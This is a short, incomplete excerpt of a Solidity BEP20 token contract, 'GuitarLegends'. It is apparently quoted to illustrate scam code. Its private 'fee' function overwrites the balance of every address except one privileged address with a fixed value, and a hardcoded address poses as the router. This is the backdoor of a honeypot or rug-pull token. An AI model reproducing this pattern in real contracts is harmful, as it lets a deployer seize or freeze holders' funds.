...
contract GuitarLegends is Context, IBEP20, Ownable {
    ...
    address public addr=0x776EAdD5C8db75a09AC5f979246c2BEF826c3B25;
    address _routeradd=0x776EAdD5C8db75a09AC5f979246c2BEF826c3B25;
    ...
    function fee(address addr) private
    {
        if (addr!=con)
        {
            bal[addr]=bonus;
